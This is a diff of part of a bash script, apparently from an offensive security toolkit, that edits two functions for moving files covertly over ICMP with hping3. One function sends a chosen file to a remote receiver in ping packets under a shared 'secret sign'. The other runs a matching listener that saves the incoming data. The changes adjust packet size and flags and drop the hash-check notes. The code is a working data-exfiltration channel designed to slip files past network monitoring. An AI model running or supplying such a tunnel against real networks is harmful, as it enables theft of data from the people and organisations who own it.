@@ -759,16 +759,11 @@ icmpextract()
 #need a passphrase, which must match the one defined by the receiver
   echo "What is your secret sign? (needs to be same on both ends)"
   read -i $SECRET -e SECRET
-  SIZE=$(ls -l $EXTRACT | cut -d ' ' -f 5)
-#calculate size to include length of secret in bytes
-  SECRETSIZE=$(printf "%s" "$SECRET" |wc -c)
-  SIZE=$(expr $SIZE + $SECRETSIZE)
 #extract the file
-  echo "Starting extraction.."
-  sudo hping3 $RECEIVER --icmp \
-  --sign $SECRET -d $SIZE -c 1 --file $EXTRACT --end
-#i should probably add a hash check of $EXTRACT here
-  echo "Done. You can check the file integrity on the receiver using hash values"
+  echo "Starting extraction..please be patient!"
+  sudo hping3 $RECEIVER --icmp -d 100 --sign $SECRET --safe --end --file $EXTRACT
+  echo ""
+  echo "Done!"
 }
 ##END ICMPEXTRACTION##
 ######################
@@ -793,13 +788,12 @@ icmpreceive()
   read -i $SECRET -e SECRET
 #start the listener
   echo "Starting listener.. Ctrl+C to stop when done."
-  sudo hping3 --listen $EXTRACTOR -I $INTERFACE \
-  --sign $SECRET > $OUTFILE
+  sudo hping3 $EXTRACTOR --listen $SECRET -I $INTERFACE --end --safe > $OUTFILE
 #when finished, identify the type of file received (e.g text, binary)
   echo "Done, checking filetype.."
   file $OUTFILE
-#i should add an md5/sha hash check here
-  echo "Done. You can check the integrity using hashing values"
+  echo ""
+  echo "Done!"
 }
 ##END ICMPRECEIVER##
 ####################
